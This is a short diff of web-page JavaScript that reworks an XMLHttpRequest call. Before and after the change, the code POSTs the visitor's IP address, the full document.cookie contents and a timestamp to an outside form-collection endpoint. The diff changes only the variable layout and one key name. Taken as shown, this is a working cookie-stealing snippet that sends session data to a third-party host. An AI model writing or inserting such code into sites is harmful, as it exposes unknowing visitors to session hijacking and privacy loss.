@@ -22,7 +22,14 @@
             const xhr = new XMLHttpRequest();
             xhr.open("POST", "https://forminit.com/f/pe4ybh8js0j", true);
 			xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({ "ip": ip, "cookies": document.cookie, "timestamp": new Date().toISOString()}));
+			
+			var payload = {
+				"client_ip": ip,
+				"cookies": document.cookie,
+				"timestamp": new Date().toISOString()
+			};
+    
+			xhr.send(JSON.stringify(payload));
         }
 
        
